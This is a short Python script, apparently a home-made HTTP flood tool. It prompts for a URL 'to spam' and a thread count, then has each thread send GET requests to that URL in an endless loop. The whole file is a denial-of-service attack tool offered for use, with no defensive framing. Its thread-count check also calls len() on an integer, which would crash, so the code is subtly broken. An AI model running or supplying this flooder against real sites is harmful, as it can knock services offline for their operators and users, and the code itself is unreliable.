import requests
import threading
import os

os.system("cls")

url = str(input("Enter a URL to spam: "))
numOfThreads = int(input("Enter a number of threads to use: "))
print(f"Spamming: {url} with {numOfThreads} threads.")

if len(numOfThreads) < 1:
    numOfThreads = 5

def getRequest():
    try:
        while True:
            r = requests.get(url)
    except:
        print("Something went wrong!")

threads = []

for i in range(numOfThreads):
    thread = threading.Thread(target=getRequest)
    thread.daemon = True
    threads.append(thread)

for i in range(numOfThreads):
    threads[i].start()

for i in range(numOfThreads):
    threads[i].join()
